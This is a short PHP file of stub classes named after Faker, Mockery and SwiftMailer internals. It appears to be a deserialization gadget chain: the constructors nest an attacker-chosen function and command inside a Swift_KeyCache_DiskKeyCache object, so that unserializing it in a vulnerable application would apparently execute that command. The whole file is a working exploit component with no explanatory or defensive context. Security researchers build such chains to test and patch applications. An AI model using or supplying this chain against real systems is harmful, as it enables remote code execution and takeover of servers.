<?php

namespace Faker
{
    class DefaultGenerator
    {
        protected $default;

        public function __construct($cmd)
        {
            $this->default = $cmd;
        }
    }
    class ValidGenerator
    {
        protected $generator;
        protected $validator;
        protected $maxRetries;

        public function __construct($function, $cmd)
        {
            $this->generator = new DefaultGenerator($cmd);
            $this->maxRetries = 9;
            $this->validator = $function;
        }
    }
}

namespace Mockery\Generator 
{
    use Faker\ValidGenerator;

    class DefinedTargetClass
    {
        private $rfc;
        
        public function __construct($function, $cmd)
        {
            $this->rfc = new ValidGenerator($function, $cmd);
        }
    }
}

namespace
{
    use Mockery\Generator\DefinedTargetClass;

    class Swift_KeyCache_DiskKeyCache
    {
        private $_keys = ['fallingskies' => ['fallingskies' => 'fallingskies']];
        private $_path;

        public function __construct($function, $cmd)
        {
            $this->_path = new DefinedTargetClass($function, $cmd);
        }
    }
}
